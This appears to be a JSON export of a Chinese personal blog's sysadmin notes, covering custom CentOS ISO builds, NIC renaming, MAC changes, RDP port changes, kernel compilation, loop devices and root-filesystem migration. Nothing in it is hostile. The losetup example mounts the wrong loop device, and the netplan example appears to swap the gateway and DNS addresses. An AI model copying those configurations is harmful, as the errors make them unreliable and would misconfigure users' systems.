下载需要安装的rpm包及其依赖到&#x2F;centos_std&#x2F;Packages里，更新repodata中的软件库索引文件 推荐使用repotrack（该软件在yum-utils包里） 123456789101112yum -y install yum-utilsrepotrack &lt;package-name&gt; -p &lt;下载路径&gt;&lt;package-name&gt;可以使用 yum install &lt;软件名&gt;查找例1：yum install vim，找到包为vim-enhanced-7.4.629-8.el7_9.x86_64repotrack vim-enhanced -p /centos_std/Packages这就会下载vim-enhanced包和这个包的依赖要打的包和依赖都下载完后，要更新软件库索引 更新索引文件 123456789cp /centos_std/repodata/*-std.xml /centos_std/std.xml编辑std.xml，把要加的软件加进去把要打的rpm包加到Packages里rm -rf /centos_std/repodatacreaterepo -g /centos_std/std.xml /centos_std/ 编辑kickstart.cfg文件 编辑好了之后，需要修改&#x2F;centos_std&#x2F;isolinux.cfg ； &#x2F;centos_std&#x2F;EFI&#x2F;BOOT&#x2F;grub.cfg文件 12345label linux menu label ^Install CentOS 7 kernel vmlinuz append initrd=initrd.img inst.stage2=hd:LABEL=centos7 inst.ks=hd:LABEL=centos7:/isolinux/std.cfg quiet 以上是linux启动参数的一部分 『inst.ks&#x3D;hd:LABEL&#x3D;centos7:&#x2F;isolinux&#x2F;std.cfg』意思就是启动后解析std.cfg，按照该脚本安装系统 『inst.stage2&#x3D;hd:LABEL&#x3D;centos7』 （生成后的iso文件卷标为centos7）门牌号的意思 生成iso文件 1mkisofs -o /STD.iso -b isolinux/isolinux.bin -c isolinux/boot.cat --no-emul-boot --boot-load-size 4 --boot-info-table -J -R -T -V &quot;centos7&quot; /centos_std 注： mkisofs 的卷标要与&#x2F;centos_std&#x2F;isolinux.cfg ； &#x2F;centos_std&#x2F;EFI&#x2F;BOOT&#x2F;grub.cfg文件里的卷标一致 5.x内核的rpm包","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"iso","slug":"iso","permalink":"http://example.com/tags/iso/"},{"name":"系统封装","slug":"系统封装","permalink":"http://example.com/tags/%E7%B3%BB%E7%BB%9F%E5%B0%81%E8%A3%85/"}]},{"title":"lsof","slug":"lsof命令","date":"2022-03-09T16:00:00.000Z","updated":"2022-03-10T01:51:56.000Z","comments":true,"path":"2022/03/10/lsof命令/","permalink":"http://example.com/2022/03/10/lsof%E5%91%BD%E4%BB%A4/","excerpt":"","text":"使用 kill 和 lsof 命令杀死指定端口的进程1kill -9 `lsof -t -i:port`","categories":[{"name":"Linux磁盘","slug":"Linux磁盘","permalink":"http://example.com/categories/Linux%E7%A3%81%E7%9B%98/"}],"tags":[{"name":"lsof","slug":"lsof","permalink":"http://example.com/tags/lsof/"}]},{"title":"centos安装yum","slug":"安装yum","date":"2022-02-23T16:00:00.000Z","updated":"2022-02-25T06:26:56.000Z","comments":true,"path":"2022/02/24/安装yum/","permalink":"http://example.com/2022/02/24/%E5%AE%89%E8%A3%85yum/","excerpt":"","text":"可以参考这篇文章centos7 安装yum源 注： rpm -ivh 可直接加文件的链接 依赖关系并不像该文章中所说的那样，要根据实际情况（安装过程中的提示）来安装yum的包 centos包的仓库http://mirrors.163.com/centos/7/os/x86_64/Packages/","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"yum","slug":"yum","permalink":"http://example.com/tags/yum/"},{"name":"软件包管理器","slug":"软件包管理器","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/"}]},{"title":"文件已经删除，但空间未释放怎么办？","slug":"文件已删除但空间未释放","date":"2022-02-23T16:00:00.000Z","updated":"2022-02-24T02:57:44.000Z","comments":true,"path":"2022/02/24/文件已删除但空间未释放/","permalink":"http://example.com/2022/02/24/%E6%96%87%E4%BB%B6%E5%B7%B2%E5%88%A0%E9%99%A4%E4%BD%86%E7%A9%BA%E9%97%B4%E6%9C%AA%E9%87%8A%E6%94%BE/","excerpt":"","text":"原因分析有程序一直占用这个文件，并向该文件写入东西 通常不会出现删除文件后空间不释放的情况，特殊情况是文件进程锁定，或有进程一直在向这个文件写数据。 为了分析根因，首先需要了解Linux文件的存储机制和存储结构。 一个文件在文件系统中存放分为两个部分： 指针部分：指针位于文件系统的meta-data中，在将数据删除后，这个指针就从meta-data中清除了。 数据部分：而数据部分存储在磁盘中。 将数据对应的指针从meta-data中清除后，文件数据部分占用的空间就可以被覆盖并写入新的内容。出现删除access_log文件后，空间还没有释放的原因，是因为httpd进程还在一直向这个文件写入内容，导致删除了access_log文件后，进程锁定，文件对应的指针部分并未从meta-data中清除，由于指针并未删除，系统内核就默认文件并未被删除，因此查询文件系统使用率时，显示空间并未释放。 处理方法方法一使用lsof命令查看是否有进程一直在向access_log文件中写入数据。 1# lsof -n |grep delete 可以选择关闭或者重启 占用该文件 的进程，或重启操作系统。 方法二在线清空access_log 执行以下命令清空access_log。 1# echo &quot;&quot;&gt;/access_log 通过这种方法，磁盘空间不但可以马上释放，也可以保证进程继续向文件写入日志，再次执行df-h查看根分区空间已经释放(未验证) 参考：文件已经删除，但空间未释放怎么办？","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"lsof","slug":"lsof","permalink":"http://example.com/tags/lsof/"},{"name":"删除文件","slug":"删除文件","permalink":"http://example.com/tags/%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/"}]},{"title":"vbox设置共享文件夹","slug":"vbox设置共享文件夹","date":"2022-02-19T16:00:00.000Z","updated":"2022-02-20T05:40:06.000Z","comments":true,"path":"2022/02/20/vbox设置共享文件夹/","permalink":"http://example.com/2022/02/20/vbox%E8%AE%BE%E7%BD%AE%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9/","excerpt":"","text":"操作流程VirtualBox Win7 虚拟机 共享文件夹设置 主机(Win10) 点击共享文件夹，例如D:\\VMs\\Sharefolder\\，选择’属性-&gt;共享-&gt;共享’，选择’Everyone’，点击’添加’，权限级别’读取&#x2F;写入’，然后一路点确定。 linux直接创个文件，给vbox权限就行 虚拟机(Win7) VirtualBox-&gt;打开Win7虚拟机 VirtualBox-&gt;设备-&gt;安装增强功能-&gt;安装完成后重启虚拟机 VirtualBox-&gt;设备-&gt;共享文件夹-&gt;添加共享文件夹-&gt;选择Win10系统中共享文件夹，例如D:\\VMs\\Sharefolder-&gt;勾选’自动挂载’和’固定分配’-&gt;点’确定’ 虚拟机-&gt;开始-&gt;控制面板-&gt;网络和共享中心-&gt;更改高级共享设置-&gt;勾选’启用网络发现’-&gt;勾选’启用文件和打印机共享’ 虚拟机-&gt;开始-&gt;计算机-&gt;映射网络驱动器-&gt;选择驱动器盘符，尽量不用Z，因为Z有特殊用途-&gt;点击’浏览’选择’网络\\VBOXSVR\\Sharefolder’-&gt;一路点击’确定&#x2F;完成’ 增强功能这就是一个iso镜像（里面封装着安装包），不要下载6.3.1，有bug，用6.1.0的 下载完后放在~/.config/VirtualBox里面，然后在vbox图像界面把这个镜像加入虚拟光盘即可 把这个虚拟光盘挂载到虚拟机里安装即可。 6.1.0下载地址https://download.virtualbox.org/virtualbox/6.1.0/","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"vbox","slug":"vbox","permalink":"http://example.com/tags/vbox/"}]},{"title":"Windows防火墙开启ping,禁ping的配置","slug":"win_ping","date":"2022-01-20T16:00:00.000Z","updated":"2022-01-21T08:25:58.000Z","comments":true,"path":"2022/01/21/win_ping/","permalink":"http://example.com/2022/01/21/win_ping/","excerpt":"","text":"Windows XP，Windows Server 2003：Windows防火墙 –&gt; 高级 –&gt; ICMP –&gt; 设置 –&gt; 把“允许传入回显请求”前打上勾 –&gt; 确定 –&gt; 大功告成。 Windows 7，Win 2008 R2，2012 R2：Windows防火墙 –&gt; 高级设置 –&gt; 入站规则 –&gt; 在列表里找到“文件和打印机共享(回显请求 - ICMPv4-In)” –&gt; 右击选择启用规则，并在其属性里设置为‘允许连接’–&gt; 确定 –&gt; 大功告成。要禁止ping,去掉勾选即可. Windows防火墙开启ping,禁ping的配置","categories":[{"name":"windows","slug":"windows","permalink":"http://example.com/categories/windows/"}],"tags":[{"name":"ping","slug":"ping","permalink":"http://example.com/tags/ping/"}]},{"title":"windows远程","slug":"windows远程配置","date":"2022-01-20T16:00:00.000Z","updated":"2022-01-21T08:24:22.000Z","comments":true,"path":"2022/01/21/windows远程配置/","permalink":"http://example.com/2022/01/21/windows%E8%BF%9C%E7%A8%8B%E9%85%8D%E7%BD%AE/","excerpt":"","text":"一朝被蛇咬十年怕井绳…下略 修改远程端口打开注册表编辑器（开始，运行，输入 regedit，回车） 修改『HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp』对应的『PortNumber』值，然后修改 接着修改『HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp』对应的『PortNumber』值，一并改掉 修改端口之后，一定要去windows防火墙里添加允许这个端口远程连接（如果vps的windows防火墙是关闭的就不用这么做了） win10 开放防火墙的某一端口 打开控制面板，选择windows 防火墙 点击左侧的『高级设置』选项 设置入站规则 点击『新建规则』，点选『端口』，单击 『下一步』 注意：入站规则是指别人电脑访问自己电脑；出站规则实质自己电脑访问别人电脑 选择相应的协议 例如：添加8080端口，选择TCP；特定本地端口处输入8080； 选择『允许连接』，点击『下一步』； 勾选『域』，『专用』，『公司』，点击“下一步” 输入端口名称，点『完成』即可 修改完之后 【1】 直接重启服务器，使配置生效 【2】 或重启远程桌面相关服务（无需重启服务器） 按『win+r』快捷键，在对话框中输入services.msc 查找Remote Desktop Services和Remote Desktop Configuration，点击重新启动。 参考windows修改远程端口操作(无须重启服务器) 如何修改windows VPS默认3389端口","categories":[{"name":"windows","slug":"windows","permalink":"http://example.com/categories/windows/"}],"tags":[{"name":"修改端口","slug":"修改端口","permalink":"http://example.com/tags/%E4%BF%AE%E6%94%B9%E7%AB%AF%E5%8F%A3/"},{"name":"rdp","slug":"rdp","permalink":"http://example.com/tags/rdp/"},{"name":"远程","slug":"远程","permalink":"http://example.com/tags/%E8%BF%9C%E7%A8%8B/"}]},{"title":"centos修改网卡mac地址","slug":"centos修改mac地址","date":"2022-01-13T16:00:00.000Z","updated":"2022-01-14T06:24:26.000Z","comments":true,"path":"2022/01/14/centos修改mac地址/","permalink":"http://example.com/2022/01/14/centos%E4%BF%AE%E6%94%B9mac%E5%9C%B0%E5%9D%80/","excerpt":"","text":"永久修改12345678910111213ifconfig eth0 downcd /etc/sysconfig/network-scriptsvi ifcfg-eth0删掉&quot;HWADDR=xx:xx:xx:xx:xx:xx&quot;编辑&quot;MACADDR=xx:xx:xx:xx:xx:xx&quot;ifconfig eth0 upservice network start 暂时修改方法一 1ip link set dev eth0 address 00:00:ff:bb:aa:00 方法二 这个没测试过 12345ifconfig eth0 down /*禁掉eth0网卡，这里以eth0网卡为例*/ifconfig eth0 hw ether 00:AA:BB:CC:DD:EE /*修改eth0网卡的MAC地址*/ifconfig eth0 up /*重新启动eth0网卡*/ 重点udev规则的mac与网卡配置文件的mac（HWADDR，MACADDR）有啥区别 udev的mac是网卡的默认mac,即网卡出厂时固定的mac地址，被厂家写进芯片里的，需要用特殊的rom工具才能修改 1.MAC地址属于芯片中的一个属性，因为在接收数据包时需要根据这个值来做包过滤。 3.HWADDR保存到网卡芯片的ROM中，由芯片厂商出厂前写入，相当于是芯片的序列号一般不能修改。 3.系统中网卡的MAC地址默认值是从HWADDR中读出，如果我们没有配置MAC地址，它默认就是等于HWADDR的。 4.MACADDR是配置到网卡的mac地址，也就是ip a显示的mac地址，如果配了该参数，那么网卡的mac地址将变成MACADDR","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"网卡MAC","slug":"网卡MAC","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1MAC/"}]},{"title":"dmsetup","slug":"dmsetup命令","date":"2022-01-03T16:00:00.000Z","updated":"2022-01-04T06:00:46.000Z","comments":true,"path":"2022/01/04/dmsetup命令/","permalink":"http://example.com/2022/01/04/dmsetup%E5%91%BD%E4%BB%A4/","excerpt":"","text":"管理lvm的工具 dmsetup ls dmsetup remove –force &#x2F;dev&#x2F;mapper&#x2F;111 linux dmsetup管理LVM命令详解 dmsetup命令 – 显示当前的device mapper的信息","categories":[{"name":"Linux磁盘","slug":"Linux磁盘","permalink":"http://example.com/categories/Linux%E7%A3%81%E7%9B%98/"}],"tags":[{"name":"dmsetup","slug":"dmsetup","permalink":"http://example.com/tags/dmsetup/"}]},{"title":"losetup","slug":"losetup","date":"2022-01-03T16:00:00.000Z","updated":"2022-01-04T06:15:12.000Z","comments":true,"path":"2022/01/04/losetup/","permalink":"http://example.com/2022/01/04/losetup/","excerpt":"","text":"loop设备介绍在类 UNIX 系统里，loop 设备是一种伪设备(pseudo-device)，或者也可以说是仿真设备。它能使我们像块设备一样访问一个文件。 在使用之前，一个 loop 设备必须要和一个文件进行连接。这种结合方式给用户提供了一个替代块特殊文件的接口。因此，如果这个文件包含有一个完整的文件系统，那么这个文件就可以像一个磁盘设备一样被 mount 起来。 上面说的文件格式，我们经常见到的是 CD 或 DVD 的 ISO 光盘镜像文件或者是软盘(硬盘)的 *.img 镜像文件。通过这种 loop mount (回环mount)的方式，这些镜像文件就可以被 mount 到当前文件系统的一个目录下。 至此，顺便可以再理解一下 loop 之含义：对于第一层文件系统，它直接安装在我们计算机的物理设备之上；而对于这种被 mount 起来的镜像文件(它也包含有文件系统)，它是建立在第一层文件系统之上，这样看来，它就像是在第一层文件系统之上再绕了一圈的文件系统，所以称为 loop。 losetup命令1234567891011losetup [ -e encryption ] [ -o offset ] loop_device filelosetup [ -d ] loop_device说明：此命令用来设置循环设备。循环设备可把文件虚拟成块设备，籍此来模拟整个文件系统，让用户得以将其视为硬盘驱动器，光驱或软驱等设备，并挂入当作目录来使用。上面，命令格式中的选项与参数名：-e 表示加密的方式-o 设置数据偏移量-d 卸载设备loop_device 循环设备名，在 linux 下如 /dev/loop0 , /dev/loop1 等。file 要与循环设备相关联的文件名，这个往往是一个磁盘镜象文件，如 *.img 使用举例 创建空的磁盘镜像文件，这里创建一个1.44M的软盘 1dd if=/dev/zero of=floppy.img bs=512 count=2880 使用 losetup将磁盘镜像文件虚拟成快设备 1losetup /dev/loop1 floppy.img 挂载块设备 1mount /dev/loop0 /tmp 经过上面的三步之后，我们就可以通过&#x2F;tmp目录，像访问真实快设备一样来访问磁盘镜像文件floppy.img。 卸载loop设备 12umount /tmplosetup -d /dev/loop1","categories":[{"name":"Linux磁盘","slug":"Linux磁盘","permalink":"http://example.com/categories/Linux%E7%A3%81%E7%9B%98/"}],"tags":[{"name":"losetup","slug":"losetup","permalink":"http://example.com/tags/losetup/"}]},{"title":"netstat","slug":"netstat","date":"2021-12-14T16:00:00.000Z","updated":"2021-12-15T08:39:26.000Z","comments":true,"path":"2021/12/15/netstat/","permalink":"http://example.com/2021/12/15/netstat/","excerpt":"","text":"netstat -tunlp","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"端口","slug":"端口","permalink":"http://example.com/tags/%E7%AB%AF%E5%8F%A3/"},{"name":"netstat","slug":"netstat","permalink":"http://example.com/tags/netstat/"}]},{"title":"centos修改网卡名称","slug":"centos修改网卡名称","date":"2021-12-02T16:00:00.000Z","updated":"2022-06-21T08:34:22.000Z","comments":true,"path":"2021/12/03/centos修改网卡名称/","permalink":"http://example.com/2021/12/03/centos%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0/","excerpt":"","text":"网卡配置文件参数详解12345678910111213141516171819202122232425# cat /etc/sysconfig/network-scripts/ifcfg-eth0TYPE=Ethernet # 设备类型 以太网DEVICE=eth0 # 网卡设备名称NAME=eth0 # 网卡连接名称BOOTPROTO=static # 地址分配模式 启用静态IP地址ONBOOT=yes # 开机自动启用网络连接 DEFROUTE=yes # 把这个eth0设置为默认路由PEERDNS=no # 不允许DHCP获得的DNS覆盖本地的DNSPEERROUTES=yes # 不从DHCP服务器获取用于定义接口的默认网关的信息的路由表条目IPV4_FAILURE_FATAL=no # 如果ipv4配置失败不禁用设备 IPADDR=192.168.56.12 # IP地址NETMASK=255.255.255.0 # 子网掩码PREFIX=24 # 子网掩码（与NETMASK一样）GATEWAY=192.168.56.2 # 网关地址DNS1=223.5.5.5 # DNS地址 USERCTL=no # 普通用户不能控制网卡NM_CONTROLLED=no # 不让Network Manager托管PROXY_METHOD=none # 代理方式：关闭状态BROWSER_ONLY=no # 支持浏览器：否 网卡配置文件的DNS优先于 /etc/resolv.conf 在线修改网卡名（重启机器会失效）把eth0改成em1 123ifconfig eth0 down ip link set eth0 name em1 ifconfig em1 up 内核启用biosdevname，禁用net.ifnamesbiosdevname详解 net.ifnames（也是一种网卡的命名规范） 修改&#x2F;etc&#x2F;default&#x2F;grub 在GRUB_CMDLINE_LINUX后添加 net.ifnames&#x3D;0 biosdevname&#x3D;1 1GRUB_CMDLINE_LINUX=&quot;crashkernel=auto rhgb quiet net.ifnames=0 biosdevname=1&quot;） 重设一下引导 1sudo grub2-mkconfig -o /etc/grub2.cfg 启用udev的60-net.rules规则&#x2F;usr&#x2F;lib&#x2F;udev&#x2F;rules.d&#x2F;60-net.rules文件中的规则指示udev辅助工具&#x2F;lib&#x2F;udev&#x2F;renamedevice查看所有&#x2F;etc&#x2F;sysconfig&#x2F;networkscripts&#x2F;ifcfg-suffix文件。如果是ifcfg文件如果发现包含 HWADDR 条目与接口的 MAC 地址匹配，它将将该接口重命名为 ifcfg 文件中的 DEVICE 指令指定的名称。如果不相符，则按照&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;60-net.rules下的规则来 1234cp /usr/lib/udev/rules.d/60-net.rules /etc/udev/rules.d/cat /etc/udev/rules.d/60-net.rulesACTION==&quot;add&quot;, SUBSYSTEM==&quot;net&quot;, DRIVERS==&quot;?*&quot;, ATTR&#123;type&#125;==&quot;1&quot;, PROGRAM=&quot;/lib/udev/rename_device&quot;, RESULT==&quot;?*&quot;, NAME=&quot;$result&quot; 通过udev指定网卡名 1ACTION==&quot;add&quot;, SUBSYSTEM==&quot;net&quot;, DRIVERS==&quot;?*&quot;, ATTR&#123;type&#125;==&quot;1&quot;, ATTR&#123;address&#125;==&quot;d8:9e:*:10:*11&quot;, NAME=&quot;eth0&quot; 修改网卡配置文件如果要把em2网卡改成eth0 1234cd /etc/sysconfig/network-scripts/mv ifcfg-em2 ifcfg-eth0把配置文件里的NAME、DEVICE改为eth0在对应网卡的配置文件中添加对应网卡的mac地址，HWADDR=ec:**:**:e1:0*:c5 如果没有配置文件，可使用以下命令添加 1234nmcli connection add type ethernet ifname em1 con-name em1 autoconnect yes警告：名为 &#x27;em1&#x27; 的连接已存在。使用 uuid &#x27;3b563e41-be15-4a21-98b9-9ca9e8777e25&#x27; 来指代连接连接 &quot;em1&quot; (3b563e41-be15-4a21-98b9-9ca9e8777e25) 已成功添加。 重启机器1reboot 原理上述的方法用了两个网卡命名规范，一个是biosdevname、一个是systemd 经测试，biosdevname命名规范必须启用，否则修改网卡为eth0（ethX系列）会出现莫名的错误，而非eth的名字则可正常修改 内核在boot过程是默认使用ethX方式来命名的，每次启动的时候都不确定，启动会后再通过udev等方式去rename，这种不确定因素太多，所以启用biosdevname比较好 启用biosdevname，禁用net.ifnames，（两种规范用一个就行） ！！！如果用户自定义了udev rules，则用户自定义的rules优先！ 使用biosdevname命名规范，所命名的网卡名如下 123em1 板载网卡p3p4 pci网卡p3p4_1 虚拟网卡 参考文档 centos7中的网卡名称相关知识 systemd.net-naming_scheme - 网络设备命名方案 RHEL7&#x2F;centos7 修改网卡名称为eth0 CentOS 7 CentOS 8 网卡命名规则 Centos 7 中网卡配置文件的优先级 一致的网络设备命名","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"网卡","slug":"网卡","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1/"}]},{"title":"md5校验","slug":"md5校验","date":"2021-12-01T16:00:00.000Z","updated":"2021-12-02T02:33:34.000Z","comments":true,"path":"2021/12/02/md5校验/","permalink":"http://example.com/2021/12/02/md5%E6%A0%A1%E9%AA%8C/","excerpt":"","text":"windows1CertUtil -hashfile &lt;path to file&gt; MD5 linux1md5sum 文件名","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"md5","slug":"md5","permalink":"http://example.com/tags/md5/"}]},{"title":"pcie总线报错","slug":"pcie报错","date":"2021-11-15T16:00:00.000Z","updated":"2021-11-16T08:48:32.000Z","comments":true,"path":"2021/11/16/pcie报错/","permalink":"http://example.com/2021/11/16/pcie%E6%8A%A5%E9%94%99/","excerpt":"","text":"排错模板","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"pcie报错","slug":"pcie报错","permalink":"http://example.com/tags/pcie%E6%8A%A5%E9%94%99/"}]},{"title":"shell数组","slug":"shell数组","date":"2021-11-15T16:00:00.000Z","updated":"2021-11-16T08:54:12.000Z","comments":true,"path":"2021/11/16/shell数组/","permalink":"http://example.com/2021/11/16/shell%E6%95%B0%E7%BB%84/","excerpt":"","text":"删除数组中的元素1234567$ array=( &quot;one two&quot; &quot;three four&quot; &quot;five six&quot; )$ unset array[1]$ array=( &quot;$&#123;array[@]&#125;&quot; )$ echo $&#123;array[0]&#125;one two$ echo $&#123;array[1]&#125;five six Shell 数组并不是真正用作可以从中添加和删除项目的数据结构(它们主要用于为以下情况提供第二级引用:提供somecommand有两个，而不是四个参数)。但这应该适用于大多数情况。 12arr=( &quot;one two&quot; &quot;three four&quot; )somecommand &quot;$&#123;arr[@]&#125;&quot;","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"数组","slug":"数组","permalink":"http://example.com/tags/%E6%95%B0%E7%BB%84/"}]},{"title":"CentOS 删除swap分区","slug":"删除swap分区","date":"2021-11-15T16:00:00.000Z","updated":"2021-11-16T08:42:44.000Z","comments":true,"path":"2021/11/16/删除swap分区/","permalink":"http://example.com/2021/11/16/%E5%88%A0%E9%99%A4swap%E5%88%86%E5%8C%BA/","excerpt":"","text":"删除swap分区 先停止swap分区1/sbin/swapoff /dev/sdb2 把自动挂载的配置清了就行 参考链接：CentOS如何手动增加 删除swap区","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"swap","slug":"swap","permalink":"http://example.com/tags/swap/"}]},{"title":"centos升级内核","slug":"centos内核升级","date":"2021-10-21T16:00:00.000Z","updated":"2021-10-22T10:40:14.000Z","comments":true,"path":"2021/10/22/centos内核升级/","permalink":"http://example.com/2021/10/22/centos%E5%86%85%E6%A0%B8%E5%8D%87%E7%BA%A7/","excerpt":"","text":"centos自带的内核一般比较老旧，会导致一些技术无法使用，这时候就需要升级内核了 升级内核的方式一般有两种： 手动编译 使用rmp包自动升级 手动升级Linux 最新版本的内核可以通过 https://www.kernel.org/ 网站获取 下载并解压1234567[root@centos_vbox ~]# ls /data2linux-5.14.10 linux-5.14.10.tar[root@centos_vbox ~]# cd /data2/linux-5.14.10arch COPYING Documentation include Kbuild lib Makefile modules.builtin.modinfo Module.symvers samples sound usr vmlinux.oblock CREDITS drivers init Kconfig LICENSES mm modules-only.symvers net scripts System.map virt vmlinux.symverscerts crypto fs ipc kernel MAINTAINERS modules.builtin modules.order README security tools vmlinux 编译配置将&#x2F;boot下的配置文件拷贝过来使用，作为编译目标目录下的.config文件。这样对内核没有精简。 cp &#x2F;boot&#x2F;config-3.10.0-1160.el7.x86_64 .&#x2F;.config 从boot目录拷贝原内核的config文件过来主要是为了方便，这个文件保存了在安装系统时内核所安装的模块配置信息（这个是最简单的，否则需要重新手动指定每一个模块的编译配置）。 参考链接：精简Linux内核编译的简单方法 安装依赖包使用menuconfig，安装开发工具包组 1yum -y groupinstall &quot;development tools&quot; 安装ncurse-devel包 （make menuconfig 文本界面窗口依赖包） 1yum -y install ncurses-devel 编译运行 make menuconfig，开启文本界面的编译选项菜单窗口，可以对内核加载的模块编译选项进行调整，如修改编译后的内核名称、新添加之前系统缺少的模块等。 参考链接：CentOS 7下源码编译安装新版本内核 1make -j 4 #根据CPU核数开启多线程编译以加快编译速度 安装内核编译完成后执行 make modules_install 安装内核模块 用此方法安装的内核极大（4G左右） 原因分析： 12345默认内核配置配置为支持尽可能多的硬件。 具有默认配置的非剥离内核导致大小为 1897996 kB（包括内核 + 模块）。 当剥离许多不必要的驱动程序和选项时，它的大小为 892892 kB，与库存内核相比，大小减少了 53%。安装内核模块时，附加 INSTALL_MOD_STRIP=1 选项。 这将去除所有调试符号并将我的大小减少 92%（从 892892 kB 到 69356 kB）。 请注意，这只会影响要安装的模块，而不影响内核 (vmlinuz) 本身。使用 INSTALL_MOD_STRIP 选项删除调试符号： 想让内核变得更小（200M左右）执行 1make INSTALL_MOD_STRIP=1 modules_install 安装内核核心文件1make install 重启系统 reboot 如需将新版本内核设置为默认启动内核，可以使用此命令 grub2-set-default 0 #0表示 &#x2F;boot&#x2F;grub2&#x2F;grub.cfg 文件中排在第一位的 menuentry 段 可能遇到的问题gcc版本过低 升级gcc 安装centos-release-scl 1yum install centos-release-scl 安装devtoolset，注意，如果想安装7.版本的，就改成devtoolset-7-gcc，以此类推 1yum install devtoolset-7-gcc* 激活对应的devtoolset，所以你可以一次安装多个版本的devtoolset，需要的时候用下面这条命令切换到对应的版本 123scl enable devtoolset-7 bash这条激活命令只对本次会话有效，重启会话后还是会变回原来的4.8.5版本，要想随意切换可按如下操作。 切换到某个版本，只需要执行 1source /opt/rh/devtoolset-7/enable 查看gcc版本 1gcc -v 直接替换旧的gcc 旧的gcc是运行的 &#x2F;usr&#x2F;bin&#x2F;gcc，所以将该目录下的gcc&#x2F;g++替换为刚安装的新版本gcc软连接，免得每次enable 1234567891011mv /usr/bin/gcc /usr/bin/gcc-4.8.5ln -s /opt/rh/devtoolset-7/root/bin/gcc /usr/bin/gccmv /usr/bin/g++ /usr/bin/g++-4.8.5ln -s /opt/rh/devtoolset-7/root/bin/g++ /usr/bin/g++gcc --versiong++ --version 参考链接：CentOS 7升级gcc版本","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"秘术：升核","slug":"秘术：升核","permalink":"http://example.com/tags/%E7%A7%98%E6%9C%AF%EF%BC%9A%E5%8D%87%E6%A0%B8/"}]},{"title":"ubuntu配置静态ip","slug":"ubuntu配置静态ip","date":"2021-10-21T16:00:00.000Z","updated":"2021-10-22T06:06:00.000Z","comments":true,"path":"2021/10/22/ubuntu配置静态ip/","permalink":"http://example.com/2021/10/22/ubuntu%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81ip/","excerpt":"","text":"注意： 18.04和16.04不一样了，配置静态ip的方法有很大差异！ 查找netplan目录下默认的网络配置文件，文件后缀为.yaml，我的是叫01-network-manager-all.yaml的文件。如果没有可以使用sudo touch 01-network-manager-all.yam自己创建。 配置文件 123456789101112# Let NetworkManager manage all devices on this systemnetwork: version: 2 renderer: NetworkManager ethernets: enp3s0: #配置的网卡名称,使用ifconfig -a查看得到 dhcp4: no #dhcp4关闭 addresses: [192.168.3.47/24] #设置本机IP及掩码 gateway4: 114.114.114.114 #设置网关 nameservers: addresses: [192.168.3.1] #设置DNS 配置完成后，使用 sudo netplan apply 命令生效配置。 参考链接","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"常识","slug":"常识","permalink":"http://example.com/tags/%E5%B8%B8%E8%AF%86/"},{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"grub rescue","slug":"grub_rescue","date":"2021-09-23T16:00:00.000Z","updated":"2021-09-24T08:34:44.000Z","comments":true,"path":"2021/09/24/grub_rescue/","permalink":"http://example.com/2021/09/24/grub_rescue/","excerpt":"","text":"cpu在读mbr分区的时候没找到grub，所以就卡在grub rescue上了 我们要做的就是收到给他设置 参考链接： GRUB grub rescue救援模式的处理 参考2","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"系统救援","slug":"系统救援","permalink":"http://example.com/tags/%E7%B3%BB%E7%BB%9F%E6%95%91%E6%8F%B4/"}]},{"title":"切换根目录","slug":"切根","date":"2021-09-23T16:00:00.000Z","updated":"2021-09-24T10:08:32.000Z","comments":true,"path":"2021/09/24/切根/","permalink":"http://example.com/2021/09/24/%E5%88%87%E6%A0%B9/","excerpt":"","text":"切根有两步 复制一个一模一样的根目录（影分身） 修改grub，使系统启动时直接挂新的根目录（移花接木） 第一步：影分身复制当让要复制的一模一样，把新的盘重新分区，写入ext4文件系统（原根分区就是ext4） 12345678910111213parted -s /dev/sda5 mklabel gpt mkpart primary ext4 0% 100%mkfs.ext4 /dev/sda5rsync -av --exclude=/proc --exclude=/sys --exclude=/dev --exclude=/home --exclude=/boot --exclude=/mnt --exclude=/std / /std把根分区的东西复制过去（包括权限），记得排除/std，不然的话就无限循环了在新的根目录/std下创建一些目录，如/boot ，/run ，/sys，/dev，/proc，/mnt等然后执行下列命令绑定挂载临时文件系统到新的根下，mount --rbind /proc /std/procmount --rbind /dev /std/devmount --rbind /sys /std/sys 第二步：移花接木完成上一步后就可以切换的新根下了 chroot &#x2F;std 此时&#x2F;std已经是一个可以使用的系统 